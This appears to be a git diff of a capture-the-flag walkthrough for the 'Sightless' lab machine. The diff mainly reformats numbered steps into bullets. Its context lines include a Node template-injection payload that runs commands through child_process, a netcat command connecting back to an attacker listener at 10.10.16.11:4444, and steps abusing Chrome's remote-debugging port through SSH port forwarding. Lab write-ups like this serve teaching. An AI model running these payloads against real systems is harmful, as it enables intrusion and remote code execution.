@@ -69,13 +69,13 @@ We can get some information disclosure and get a username `john`.
 Searching for `exploits`, we find this [link](https://huntr.com/bounties/46630727-d923-4444-a421-537ecd63e7fb) that reference to `template injection` leading to `Remote code execution`.  
 
 Following the steps:  
-1. Make a new `MYSQL` connection
+* Make a new `MYSQL` connection
 
 <br/> 
 <img src="/img/sightless_screenshots/Pasted image 20240911091454.png" alt="1" style="width:700px; height:auto;">
 <br/>
 
-2. Add the command to be executed in the `Database` Textbox with this format.
+* Add the command to be executed in the `Database` Textbox with this format.
 
 ```node
 	{{ process.mainModule.require('child_process').exec('Command') }}
@@ -90,7 +90,7 @@ Choosing this command to test for connection
 nc -nv 10.10.16.11 4444
 ```
 
-3. Before saving, we open a `nc` listener and wait for a connection.
+* Before saving, we open a `nc` listener and wait for a connection.
 
 <br/> 
 <img src="/img/sightless_screenshots/Pasted image 20240911091841.png" alt="1" style="width:700px; height:auto;">
@@ -194,28 +194,27 @@ Checking the service running on `localhost:8080`
 `Default credentials` did not work.  
 Abusing the  remote-debugging-port in chrome following this [link](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/)  
 Following those steps:
-1. Guessing the correct `port` because of the `randomization` being used.
-2. `Local port` forwarding the correct `port`
+* Guessing the correct `port` because of the `randomization` being used.* `Local port` forwarding the correct `port`
 
 ``` bash
 ssh -L 39261:127.0.0.1:39261 michael@10.10.11.32
 ```
 
-3. Open `chrome` and type `chrome://inspect/#devices`
-4. click `Configure…` at the right of `Discover network targets`. The modal window opens.
-5. In the modal window, enter `127.0.0.1:39261` then click `Done`.
+* Open `chrome` and type `chrome://inspect/#devices`
+* click `Configure…` at the right of `Discover network targets`. The modal window opens.
+* In the modal window, enter `127.0.0.1:39261` then click `Done`.
 
 <br/> 
 <img src="/img/sightless_screenshots/Pasted image 20240911131350.png" alt="1" style="width:700px; height:auto;">
 <br/>
 
-6. Now we should see the remote host appears at the bottom of the `Remote Target`.
+* Now we should see the remote host appears at the bottom of the `Remote Target`.
 
 <br/> 
 <img src="/img/sightless_screenshots/Pasted image 20240911131415.png" alt="1" style="width:700px; height:auto;">
 <br/>
 
-7. Click `inspect` then new browser open. We can browse the website.
+* Click `inspect` then new browser open. We can browse the website.
 
 <br/> 
 <img src="/img/sightless_screenshots/Pasted image 20240911131444.png" alt="1" style="width:700px; height:auto;">
